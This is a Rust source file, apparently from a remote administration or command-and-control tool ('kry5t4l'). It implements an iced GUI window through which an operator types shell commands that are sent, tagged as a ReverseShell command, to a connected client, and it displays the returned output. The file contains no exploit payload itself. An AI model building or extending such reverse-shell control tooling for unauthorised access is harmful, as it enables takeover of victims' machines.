use std::net::SocketAddr;
use iced::{
    widget::{
        button, column, container, row, scrollable, text, text_input
    },
    Alignment, Background, Border, Color, Element, Length
};
use chrono::{Local};
use crate::modules::network::{send_command_to};
use kry5t4l_share::modules::CommandType;

#[derive(Debug, Clone)]
pub struct RemoteShellWindow {
    pub client_id: String,
    pub peer_addr: SocketAddr,
    pub pid: Option<u32>,
    pub title: String,
    pub output: String,
    pub input: String,
    pub connecting: bool,
}

#[derive(Debug, Clone)]
pub enum RemoteShellMessage {
    InputChanged(String),
    SendCommand,
    // 内部消息，不需要外部发送
    _ConnectionEstablished(u32),
    _OutputReceived(String),
}

#[derive(Debug, Clone)]
pub enum ShellUpdate {
    SetPid {
        client_id: String,
        pid: u32,
        peer_addr: SocketAddr,
    },
    AppendOutput {
        client_id: String,
        pid: u32,
        output: String,
    },
}

impl RemoteShellWindow {
    pub fn new(client_id: String, peer_addr: SocketAddr) -> Self {
        let timestamp = Local::now().format("%H:%M:%S").to_string();
        let initial_output = format!("[{}] 正在连接...\n", timestamp);
        
        Self {
            client_id,
            peer_addr,
            pid: None,
            title: "正在连接".to_string(),
            output: initial_output,
            input: String::new(),
            connecting: true,
        }
    }

    pub fn update(&mut self, message: RemoteShellMessage) {
        match message {
            RemoteShellMessage::InputChanged(value) => {
                self.input = value;
                println!("Input changed: {}", self.input);  // 打印输入内容
            }
            RemoteShellMessage::SendCommand => {
                if !self.input.trim().is_empty() && self.pid.is_some() {
                    // 添加命令到输出显示
                    let timestamp = Local::now().format("%H:%M:%S").to_string();
                    self.output += &format!("[{}] > {}\n", timestamp, self.input);
                    
                    // 发送命令到客户端
                    self.send_shell_command(&self.input);
                    
                    // 清空输入
                    self.input.clear();
                }
            }
            RemoteShellMessage::_ConnectionEstablished(pid) => {
                self.pid = Some(pid);
                self.connecting = false;
                self.title = format!("{}:{}", self.peer_addr, pid);
                
                let timestamp = Local::now().format("%H:%M:%S").to_string();
                self.output += &format!("[{}] success PID: {}\n", timestamp, pid);
            }
            RemoteShellMessage::_OutputReceived(output) => {
                let timestamp = Local::now().format("%H:%M:%S").to_string();
                self.output += &format!("[{}] {}\n", timestamp, output);
            }
        }
    }

    pub fn send_shell_command(&self, command: &str) {
        if let Some(pid) = self.pid {
            // 构建命令数据包
            let mut buf = vec![];
            buf.push(CommandType::ReverseShell.to_u8());
            
            // 格式: PID:command
            let command_data = format!("{}:{}", pid, command);
            let mut command_bytes = command_data.as_bytes().to_vec();
            buf.append(&mut command_bytes);
            
            // 发送到对应的客户端
            if let Err(e) = send_command_to(&self.peer_addr, &buf) {
                println!("发送Shell命令失败: {}", e);
            }
        }
    }

    pub fn view(&self, _window_id: iced::window::Id) -> Element<RemoteShellMessage> {
        // 输出区域
        let output_text = text(&self.output)
            .size(12)
            .color(Color::WHITE);

        let output_container = container(
            scrollable(
                container(output_text)
                    .width(Length::Fill)
                    .padding(10)
            )
            .height(Length::Fill)
        )
        .style(|_| container::Style {
            background: Some(Background::Color(Color::BLACK)),
            border: Border {
                color: Color::from_rgb(0.3, 0.3, 0.3),
                width: 1.0,
                radius: 5.0.into(),
            },
            ..Default::default()
        })
        .height(Length::FillPortion(4));

        // 输入区域
        let input_field = text_input("Command", &self.input)
            .on_input(RemoteShellMessage::InputChanged)
            .on_submit(RemoteShellMessage::SendCommand)
            .padding(8)
            .size(12)
            .style(|_, _| text_input::Style { 
                background: Background::Color(Color::WHITE), // 白色背景
                border: Border {
                    color: Color::from_rgb(0.3, 0.3, 0.3), // 灰色边框
                    width: 1.0,
                    radius: 3.0.into(),
                },
                icon: Color::TRANSPARENT, // 没有图标，设为透明
                placeholder: Color::from_rgb(0.5, 0.5, 0.5), // 灰色占位符
                value: Color::BLACK, // 黑色输入文字
                selection: Color::from_rgb(0.8, 0.8, 1.0), // 浅蓝色选择高亮
            });

        let send_button = button(
            text("Send")
                .align_x(Alignment::Center)
                .align_y(Alignment::Center)
                //.padding([5, 15])
        )
        .on_press(RemoteShellMessage::SendCommand)
        .style(|_, _| {
            button::Style {
                background: Some(Background::Color(Color::from_rgb(0.2, 0.4, 0.8))),
                text_color: Color::WHITE,
                border: Border {
                    color: Color::from_rgb(0.1, 0.3, 0.7),
                    width: 1.0,
                    radius: 3.0.into(),
                },
                ..Default::default()
            }
        }).height(Length::Fill);

        let input_row = row![
            input_field.width(Length::Fill),
            send_button.width(Length::Fixed(80.0))
        ]
        .spacing(10)
        .align_y(Alignment::Center);

        let input_container = container(input_row)
            .padding(10)
            .height(Length::Fixed(50.0));

        // 状态栏
        let status_text = if self.connecting {
            text("状态: 正在连接...")
                .size(12)
                .color(Color::from_rgb(0.8, 0.6, 0.2))
        } else if self.pid.is_some() {
            text(format!("状态: 已连接 (PID: {})", self.pid.unwrap()))
                .size(12)
                .color(Color::from_rgb(0.2, 0.8, 0.2))
        } else {
            text("状态: 连接失败")
                .size(12)
                .color(Color::from_rgb(0.8, 0.2, 0.2))
        };

        let status_bar = container(status_text)
            .padding([5, 10])
            .style(|_| container::Style {
                background: Some(Background::Color(Color::from_rgb(0.95, 0.95, 0.95))),
                border: Border {
                    color: Color::from_rgb(0.8, 0.8, 0.8),
                    width: 1.0,
                    radius: 0.0.into(),
                },
                ..Default::default()
            })
            .height(Length::Fixed(30.0));

        // 主布局
        let content = column![
            status_bar,
            output_container,
            input_container,
        ]
        .spacing(0);

        container(content)
            .width(Length::Fill)
            .height(Length::Fill)
            .into()
    }
}

// 全局消息通道，用于在network回调中发送消息到shell窗口
use std::sync::{Arc, Mutex};
use crossbeam_channel::{unbounded, Sender, Receiver};

lazy_static::lazy_static! {
    pub static ref G_SHELL_MESSAGE_SENDER: Arc<Mutex<Option<Sender<ShellUpdate>>>> = 
        Arc::new(Mutex::new(None));
    pub static ref G_SHELL_MESSAGE_RECEIVER: Arc<Mutex<Option<Receiver<ShellUpdate>>>> = 
        Arc::new(Mutex::new(None));
}

// 初始化Shell消息通道
pub fn initialize_shell_channel() {
    let (sender, receiver) = unbounded::<ShellUpdate>();
    *G_SHELL_MESSAGE_SENDER.lock().unwrap() = Some(sender);
    *G_SHELL_MESSAGE_RECEIVER.lock().unwrap() = Some(receiver);
    println!("Shell消息通道初始化完成");
}

// 发送Shell更新消息
pub fn send_shell_update(update: ShellUpdate) {
    println!("Sending shell update: {:?}", update);
    if let Some(sender) = G_SHELL_MESSAGE_SENDER.lock().unwrap().as_ref() {
        if let Err(e) = sender.send(update) {
            eprintln!("发送Shell更新消息失败: {}", e);
        }
    }
}